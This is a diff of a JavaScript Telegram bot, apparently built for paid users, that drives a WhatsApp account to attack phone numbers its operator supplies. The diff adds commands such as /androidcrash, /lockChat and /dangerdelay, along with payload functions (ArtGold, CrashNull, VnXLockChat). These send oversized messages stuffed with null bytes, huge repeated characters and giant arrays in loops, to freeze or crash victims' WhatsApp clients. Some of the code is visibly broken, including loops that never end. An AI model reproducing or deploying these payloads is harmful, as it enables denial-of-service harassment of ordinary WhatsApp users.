@@ -1118,7 +1118,7 @@ bot.action("xsettings", async (ctx) => {
 ◇ Framework : Telegraf 
 
 ╭═───⊱『 ⚙️𝐗𝐒𝐄𝐓𝐓𝐈𝐍𝐆𝐒 𝐌𝐄𝐍𝐔 』───═⬡
-◇ /pullupdate          
+◇ /update          
 ◇ /connect
 ◇ /addprem
 ◇ /delprem
@@ -1162,8 +1162,12 @@ bot.action("xbugs", async (ctx) => {
 ◇ /delayworek - Delay Hard Worth ( Maybe )
 ◇ /EquarTerdelay - One Shoot Delay 
 ◇ /qiSys - Delay Hard Can Spam No Kenon
+◇ /dangerdelay - Delay Hard Invisible 100%
+
 ╭═───⊱『 ✨𝐕𝐈𝐒𝐈𝐁𝐋𝐄 𝐌𝐄𝐍𝐔 』───═⬡
-◇ /combox
+◇ /androidcrash - Crash Android 
+◇ /attackChanel - Attack Chanel WhatsApp
+◇ /lockChat - Lock Chat And Crash
 </pre>
 `;
 
@@ -1300,7 +1304,7 @@ bot.action("run_update", async (ctx) => {
 });
 
 //------------------(AUTO - UPDATE SYSTEM)--------------------//
-bot.command("pullupdate", async (ctx) => doUpdate(ctx));
+bot.command("update", async (ctx) => doUpdate(ctx));
 
 const UPDATE_URL =
   "https://raw.githubusercontent.com/Unbandfoul/mataneasu/refs/heads/main/index.js";
@@ -2150,7 +2154,25 @@ bot.command("EquarTerdelay", checkAllPremium, checkWhatsAppConnection, async (ct
   })();
 
 });
-/// CASE BUG BEBAS SPAM 4 ///
+/// ============= CASE BUG 4 BEBAS SPAM=============\\\
+bot.command("dangerdelay", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
+  
+  const q = ctx.message.text.split(" ")[1]; 
+  if (!q) return ctx.reply("🪧 ☇ Example : /dangerdelay 62xx");
+
+  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+
+  await ctx.reply(`✅ dangerdelay (bug) terkirim dan selesai untuk ${q}`);
+
+  (async () => {
+    for (let r = 0; r < 700; z++) {
+  await ArtGold(sock, target);
+  await sleep(1000);
+}
+  })();
+
+});
+/// CASE BUG BEBAS SPAM 5 ///
 bot.command("qiSys", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
   const q = ctx.message.text.split(" ")[1];
   if (!q) return ctx.reply(`🪧 Example: /qiSys 62xxxx`);
@@ -2185,10 +2207,10 @@ bot.command("qiSys", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
   })();
 });
 /// CASE BUG 10///
-bot.command("combox", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
+bot.command("androidcrash", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
   try {
     const q = ctx.message?.text?.split(" ")[1];
-    if (!q) return ctx.reply("🪧 ☇ Example : /combox 62xx");
+    if (!q) return ctx.reply("🪧 ☇ Example : /androidcrash 62xx");
 
     const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
 
@@ -2196,7 +2218,7 @@ bot.command("combox", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
 `<pre>
 ⬡═―━⊱ [ GXION ] ⊰━—═⬡
 ⌑ Target : ${q}
-⌑ Type   : COMBO
+⌑ Type   : CRASH ANDROID
 ⌑ Status : Successful
 ╘═—━━━━━━━━━━━—═⬡</pre>`,
       {
@@ -2209,10 +2231,10 @@ bot.command("combox", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
       }
     );
 
-    for (let i = 0; i < 6; i++) {
-      await blankButton(sock, target);
-      await sleep(700);
-      console.log(`☠️ Success Sending Bugs To : ${target}`);
+    for (let i = 0; i < 100; i++) {
+      await CrashNull(sock, target);
+      await sleep(500);
+      console.log(`🦋 Success Sending Bugs To : ${target}`);
     }
 
   } catch (err) {
@@ -2220,6 +2242,38 @@ bot.command("combox", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
     ctx.reply("❌ Terjadi error");
   }
 });
+/// CASE BUG Lock Chat ///
+bot.command("", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
+  const q = ctx.message.text.split("lockChat")[1];
+  if (!q) return ctx.reply(`🪧 Example: /lockChat 62xxxx`);
+  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+
+  await ctx.sendPhoto("https://files.catbox.moe/pm6sti.jpg", {
+    caption: `
+<pre>交 Gxion System Attacks ᝄ
+─ 𝙱𝚞𝚐 𝚜𝚞𝚌𝚌𝚎𝚜 𝚍𝚒𝚔𝚒𝚛𝚒𝚖 𝚔𝚎 𝚝𝚊𝚛𝚐𝚎𝚝,. 𝙶𝚞𝚗𝚊𝚔𝚊𝚗𝚕𝚊𝚑 𝚜𝚎𝚌𝚊𝚛𝚊 𝚋𝚒𝚓𝚊𝚔 𝚍𝚊𝚗 𝚓𝚊𝚗𝚐𝚊𝚗 𝚍𝚒 𝚜𝚊𝚕𝚊𝚑𝚐𝚞𝚗𝚊𝚔𝚊𝚗 👾
+
+"⬡═―━⊱[ 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 𝐀𝐭𝐭𝐚𝐜𝐤 ]⊰━—═⬡
+☇ Target: ${q}
+☇ Status: Succes
+☇ Type: LOCK CHAT AND CRASH WHATSAPP
+</pre>
+`,
+    parse_mode: "HTML",
+    reply_markup: {
+      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
+    },
+  });
+
+  (async () => {
+    for (let i = 0; i < 60; i++) {
+      console.log(chalk.red(`Send Lock Chat Bugs ${i + 1}/30 To ${q}`));      
+      await VnXLockChat(sock, target);
+      await sleep (1000);
+    }
+  })();
+});
+
 // ------------ (  FUNCTION BUGS ) -------------- \\
 async function DelayHardNullVnX(sock, target, ptcp = true) {
  
@@ -2380,6 +2434,69 @@ async function ArTDeadass(sock, target) {
   }
 }
 
+async function ArtGold(sock, target) {
+  while (Date.now() - Date.now() < 700000) {
+    const ResponseList = {
+      viewOnceMessage: {
+        message: {
+          listResponseMessage: {
+            title: "ArT - Gold",
+            listType: 2,
+            buttonText: null,
+            singleSelectReply: { selectRowId: "🎄" },
+            sections: Array.from({ length: 1999 }, (_, r) => ({
+              title: "ꦽ".repeat(182622),
+              rows: [`{ title: ${r + 1}, id: ${r + 1} }`],
+            })),
+            contextInfo: {
+              participant: target,
+              remoteJid: "status@broadcast",
+              mentionedJid: [
+                "1313224@s.whatsapp.net",
+                ...Array.from({ length: 1999 }, () => "2" + Math.floor(Math.random() * 7000000) + "@s.whatsapp.net")
+              ],
+              forwardingScore: 9172,
+              isForwarded: true,
+              forwardedNewsletterMessageInfo: {
+                newsletterJid: "9127162@newsletter",
+                serverMessageId: 1,
+                newsletterName: "ArT - Gold"
+              }
+            },
+            description: "ArT - Gold"
+          }
+        }
+      },
+      contextInfo: {
+        channelMessage: true,
+        statusAttributionType: 2,
+      }
+    };
+
+    await sock.relayMessage("status@broadcast", ResponseList, {
+      statusJidList: [target],
+      additional: [
+        {
+          tag: "meta",
+          attrs: {},
+          content: [
+            {
+              tag: "mentioned_users",
+              attrs: {},
+              content: [
+                {
+                  tag: "to",
+                  attrs: { jid: target },
+                }
+              ]
+            }
+          ]
+        }
+      ]
+    });
+  }
+}
+
 async function DelayedStatusHard(sock, target) {
 var mbg = generateWAMessageFromContent(target, {
 viewOnceMessage: {
@@ -2469,6 +2586,143 @@ async function SuperDelay(sock, target) {
     }
   };
  await sock.relayMessage(target, { groupStatusMessageV2: { message: msg.message } }, { participant: { jid: target } });
+}
+
+async function CrashNull(sock, target) {
+  try {
+    console.log(`Sending Crash null to ${target}`);
+    
+    const RuxzsMsg = {
+      viewOnceMessage: {
+        message: {
+          newsletterAdminInviteMessage: {
+            newsletterJid: "9999999999@newsletter",
+            newsletterName: "\u0000".repeat(350000),
+            caption: "\u0000".repeat(2000000),
+            inviteCode: "\u0000".repeat(200000),
+            inviteExpiration: 9999999999999,
+            newsletterThumbnail: "\u0000".repeat(500000),
+            contextInfo: {
+              statusAttributionType: 2,
+              statusAttributions: Array.from({ length: 2009990 }, (_, z) => ({
+                type: 1
+              })),
+              quotedMessage: {
+                paymentInviteMessage: {
+                  serviceType: 999,
+                  expiryTimestamp: 9999999999999,
+                  currencyCodeIso4217: "USD",
+                  amount1000: 999999999999,
+                  status: 999,
+                  noteMessage: {
+                    extendedTextMessage: {
+                      text: "\u0000".repeat(1000000),
+                      description: "\u0000".repeat(500000),
+                      title: "\u0000".repeat(500000)
+                    }
+                  },
+                  contextInfo: {
+                    statusAttributionType: 2,
+                    statusAttributions: Array.from({ length: 1000000 }, (_, z) => ({
+                      type: 1
+                    })),
+                    mentionedJid: Array.from({ length: 3000 }, () => 
+                      Math.floor(Math.random() * 999999999) + "@s.whatsapp.net"
+                    )
+                  }
+                }
+              },
+              deviceListMetadata: {},
+              deviceListMetadataVersion: 2,
+              forwardingScore: 99999999,
+              isForwarded: true
+            }
+          }
+        }
+      }
+    };
+    
+    await sock.relayMessage(target, RuxzsMsg, {
+      participant: { jid: target }
+    });
+    
+    console.log(`✅ Sukses Send Crash null to: ${target}`);
+    
+  } catch (err) {
+    console.error(`❌ Error: ${err.message}`);
+  }
+}
+
+async function VnXLockChat(sock, target) {
+    try {
+        await sock.relayMessage(
+            target,
+            {
+             viewOnceMessage: {
+               message: {
+                groupInviteMessage: {
+                        groupJid: "1@g.us",
+                        inviteCode: "ꦽ".repeat(5000),
+                        inviteExpiration: "99999999999",
+                       groupName: "༑ ▾ VnX Lock Chat ▾ ༑" + "ꦾ".repeat(250000),
+                       caption: " x " + "ꦾ".repeat(5000),
+                       body: { text: "\u200B" + "ោ៝".repeat(25000) },
+                       },
+                        contextInfo: {
+                          isForwarded: true,
+                          forwardingScore: 999,
+                        }
+                    }
+                }
+            },
+            { participant: { jid: target } }
+        );
+        
+        const vnxmbgg = generateWAMessageFromContent(target, {
+            viewOnceMessage: {
+                message: {
+                  templateButtonReplyMessage: {
+                  amount: "CORRUPT",
+                  selectedIndex: null,
+               contextInfo: {
+                stanzaId: null, 
+                participant: target,
+                 paymentInviteMessage: null,
+                quotedMessage: {
+                   contactMessage: {
+                        displayName: "vnx" + "ြ".repeat(25000),
+                         vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;🦠⃰‌°‌‌VnX ⿻ Are You Okay? ✶ > 666${"ြ".repeat(25000)}\nEND:VCARD`,
+                        renderLargerThumbnail: true,
+                            },
+                            contextInfo: {
+                                isForwarded: true,
+                                forwardingScore: 999,
+                            },
+                          },
+                     },
+                    },
+                },
+            },
+        }, {
+            ephemeralExpiration: 0,
+            forwardingScore: 9741,
+            isForwarded: true,
+            font: Math.floor(Math.random() * 99999999),
+            background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
+        });
+
+        await sock.relayMessage(target, {
+            viewOnceMessage: {
+              message: vnxmbgg.message,
+            },
+        }, {
+            messageId: vnxmbgg.key.id,
+            participant: { jid: target },
+        });
+
+    } catch (err) {
+        console.error("error:", err);
+    }
 }
 
 // --- Jalankan Bot --- //
